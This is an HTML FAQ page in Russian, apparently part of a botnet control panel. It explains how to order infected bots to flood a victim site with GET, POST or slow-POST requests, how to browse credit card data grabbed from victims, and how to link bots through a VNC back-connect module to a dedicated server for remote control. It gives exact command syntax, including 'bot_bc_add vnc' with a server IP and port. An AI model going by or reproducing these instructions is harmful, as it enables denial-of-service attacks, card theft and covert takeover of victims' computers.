
<html>
    <head>  
 <style type="text/css">
#background {
	position: fixed;
	background: #ffffff;
	width:100%;
	height:100%;
	top:10px;
	left:0;
	z-index: 100;
}

</style>
   
    
    <meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
 <title>FAQ</title>
    
     <style type="text/css"> html, body {
     background-image: url(theme/img/fon.jpg); 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}
       </style>
     
    </head>
 <body>
  <br>
  
    <div align="center" ><img alt="В начало" src="http://images.wikia.com/insilicosim/images/4/42/Portal-icon-FAQ.png" width=150 /></div>
     <ul> </ul>
	</p>
	<p><font style="font-family:Monotype Corsiva;"><font size="2" color="#ffffff" ><big><strong>FAQ Ddos</strong></big><br>
Данная функция позволяет отсылать get , post , slowpost  запросы на адрес жертвы. <br>Есть возможность регулировать потоки и аптайм. <br>
 <ol>
	
	
	<li>Нажимаем кнопку ddos на главной странице. (возможен заход через script)</li><br>
 <li>Видим скрипу типа <br><em>ddos post cultizm.com / 20 50 user=qweqwe&pнass=ololoq&someflood=12381273djfhdf</em><br><b></b>в данном случае <i>post</i> - тип запроса (можно прописывать вместо этого <i>get</i> или <i>slowpost</i>) , <i>cultizm.com</i> - пример url , заменяете его на url жертвы. 20 - задержки между запросами в каждом потоке, 50 - кол-во потоков, все , что после -  пост данные, их можно не писать, т.к. бот автоматически их генерирует из случайных числил. <br>Это нужно знать для более эффективного воздействия на сайт.<br>Чем ниже аптайм и выше кол-во потоков, тем сильнее ddos, однако такой вариант сильно сказывается на живучести ботов.</li>
<br><li>Не забываем юзать в скриптах команду <em>stop ddos</em> при переключении url жертв.</li></ol>
<br></big>
<big><strong>CCgrabber FAQ</strong></big><br>
<ol>
	<li>Для просмотра сграббеных сс нажимаем на кнопку ccgrabber.</li><br>
	<li>Выбираем запрос https , дату граббинга.</li><br>
	<li>После появления логов, некоторые будут начинаться с обычных линков, некоторые с C.C.grabber, в последних информация по кредитке была сгребена в полном объеме. <br>В первом случае требуется дополнительная проверка (к примеру, не был распознан CVV код и т.д.)
</li></ol><br>
<strong><big>VNC модуль</big></strong><br>
Там всё достаточно просто:<br>
<ol>
	<li>Находите дедик с выделенным IP</li><br>
	<li>Устанавливаешь на него файл evovnc.exe</li><br>
	<li>Открываешь командную строку и запускаешь этот файл со следующими параметрами: <i>evovnc.exe listen -ipv4 -cp:1080 -bp:4500</i><br><br>
	<dd> -cp:1080 это порт который открывается на дедике для твоего vnc viewer'а </dd><br>
        <dd>-bp:4500 этот порт, через который бот коннектится к дедику.</dd><br>
	</li>
	<li>В админке создаёшь для нужного бота следующий скрипт: <i>bot_bc_add vnc 24.255.207.83 4500</i> (где 24.255.207.83 IP дедика)</li><br>
	<li>Берёшь любой vnc viewer и пишешь там IP дедика и порт для коннекта: <i>24.255.207.83:1080</i><br><br>
	<dd>Весь процесс подключения бота и vnc viewer'а к дедику отображается в окне командной строки. <br>После завершения работы не забывает разорвать соединение нажатием Ctrl+C. 
</dd>	</li><br>
	<li>Не забывайте удалить внц <i>bot_bc_remove vnc 24.255.207.83 4500</i> - таким скриптом</li>
</ol><br></small></font></div>

</body>
</html>
